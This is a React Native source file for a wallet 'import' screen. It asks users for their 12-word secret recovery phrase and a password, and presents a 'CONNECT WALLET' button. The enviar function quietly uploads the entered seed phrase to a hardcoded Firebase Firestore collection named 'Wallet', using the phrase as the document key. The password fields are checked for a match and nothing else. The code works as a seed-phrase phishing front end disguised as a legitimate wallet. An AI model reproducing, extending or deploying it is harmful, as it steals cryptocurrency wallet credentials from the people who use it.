import React, { useEffect, useState } from 'react';
import { StyleSheet, TextInput, Alert, KeyboardAvoidingView } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Image } from "react-native-expo-image-cache";
import { initializeApp } from 'firebase/app';
import { getFirestore, setDoc, doc } from 'firebase/firestore';
import { BlurView } from 'expo-blur';
import SvgAtlas from './component/Logosvg';
import {
  View, Text, Button, 
} from 'react-native-ui-lib';


const ButtonSpace = 20;

const firebaseConfig = {
  apiKey: "AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8",
  authDomain: "atlas-20a8c.firebaseapp.com",
  projectId: "atlas-20a8c",
  storageBucket: "atlas-20a8c.appspot.com",
  messagingSenderId: "764124638085",
  appId: "1:764124638085:web:942422a53a05f9b58532ec",
  measurementId: "G-6YFE7TEXBL"
}

const preview = { uri: "https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg" };
const uri = 'https://i.ibb.co/wWmjsT1/solar-system-2.gif';

  const App = ({ navigation }) => {
  const [key, setKey] = useState('');
  const [password, setPasseord] = useState('');
  const [repetpassword, setRepetpassword] = useState('');


  const enviar = async () => {
    try {
      await setDoc(doc(firestore, "Wallet", key), {
        keys: key,

      });
    } catch (error) {
      alert("Error adding document: ", error);
    }
  }



  const saveData = async () => {
    try {
      await AsyncStorage.setItem('@IMPORT', key)
      //alert('Data successfully saved')
    } catch (e) {
      //alert('Failed to save the data to the storage')
    }
  }










  const handlePress = () => {


    if (!key) {
      Alert.alert('KEY IS REQUIRED');

    } else if (password != repetpassword) {

      alert('PASSWORDS DO NOT MATCH')


    } else if

      (key.slice(0, -1).split(" ").length - 1 !== 11) {


      alert(`the key must contain 12 words separated by spaces
      ` )


    } else if (!password || !repetpassword) {

      alert('PASSWORD IS REQUIRED')


    }
    else {


      saveData();

      enviar();
      navigation.navigate('Home');
    }
  };





  initializeApp(firebaseConfig);

  const firestore = getFirestore();



  return (

    <KeyboardAvoidingView behavior="position" enabled>

      <View style={styles.container}>
        <View style={styles.header}>
          <BlurView intensity={90}>

            <Image style={{
              height: '70%', width: '100%'
            }} {...{ preview, uri }} />
          </BlurView>

        </View>

        <View style={styles.circle} >
          <View flex-1>

            <View flex-1 style={{ alignSelf: 'center', alignItems: 'center', marginTop: 40 }}>
              <SvgAtlas /></View>

            <View marginT-300 style={{ position: 'absolute', alignSelf: 'center', }} width={'100%'}>

              <View marginT-10 style={{ position: 'absolute', backgroundColor: '#1d1d1d', width: '100%', height: 400, alignSelf: 'center' }}>




                <Text color={'#fff'} center={true} text115 marginB-5 marginT-10>
                  SECRET RECOVERY PHRASE
                </Text>

                <TextInput
                  style={styles.input}
                  placeholder="Separate each word with a single space (ex: coffee milk flower...)"
                  keyboardType="string"
                  placeholderTextColor={'gray'}
                  value={key}
                  onChangeText={(key) => setKey(key)}




                />
                <Text center={true} color={'#fff'} text85 marginB-5 marginT-3>
                  ENTER PASSWORD          </Text>
                <TextInput

                  secureTextEntry={true}
                  style={styles.input}
                  placeholder="ENTER PASSWORD AT LEAST 8 CHARACTERS"
                  placeholderTextColor={'gray'}
                  keyboardType="string"
                  onChangeText={(password) => setPasseord(password)}

                />

                <Text color={'#fff'} center={true} text85 marginB-5 marginT-3>
                  CONFIRM PASSWORD
                </Text>
                <TextInput
                  secureTextEntry={true}
                  style={styles.input}
                  placeholder="CONFIRM PASSWORD"
                  placeholderTextColor={'gray'}
                  keyboardType="string"
                  onChangeText={(repetpassword) => setRepetpassword(repetpassword)}
                />




                <Button marginT-20
                  label={'CONNECT WALLET'}
                  borderRadius={4}
                  style={{ marginBottom: ButtonSpace, backgroundColor: '#1c94f4', width: '90%', alignSelf: 'center' }}
                  //onPress={()=>{alert(keyVerifi)} }
                  onPress={handlePress}
                />




              </View>

            </View>

          </View>
        </View>

      </View>
    </KeyboardAvoidingView>

  );
};

export default App;

const styles = StyleSheet.create({
  container: {
    backgroundColor: '#1d1d1d',
  },
  header: {
    width: '100%',
    height: '100%',
    position: 'relative',
    top: 0,
    left: 0,
  },
  circle: {
    height: '100%',
    width: '100%',
    position: 'absolute',
    alignSelf: 'center',
    alignItems: 'center',
    justifyContent: 'center',

    flex: 1,

  },
  input: {
    width: '80%',
    height: 40,
    borderRadius: 7,
    color: '#fff',
    margin: 12,
    borderWidth: 1,
    padding: 10,
    alignSelf: 'center',
    marginBottom: 20

  },


});


